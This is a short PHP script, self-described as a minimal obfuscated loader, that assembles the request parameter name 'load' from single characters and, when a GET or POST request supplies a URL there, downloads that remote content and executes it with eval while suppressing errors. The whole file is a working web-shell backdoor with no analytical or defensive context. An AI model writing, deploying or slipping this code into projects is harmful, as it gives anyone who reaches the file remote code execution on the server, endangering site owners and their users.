<?php
// Minimal obfuscated loader
$p1 = "l"."o"."a"."d";
$p2 = "l"."o"."a"."d";

if (isset($_GET[$p1])) {
    $u = $_GET[$p1];
    if (filter_var($u, FILTER_VALIDATE_URL)) {
        @eval("?>" . file_get_contents($u));
    }
    exit;
}

if (isset($_POST[$p2])) {
    $u = $_POST[$p2];
    if (filter_var($u, FILTER_VALIDATE_URL)) {
        @eval("?>" . file_get_contents($u));
    }
    exit;
}
?>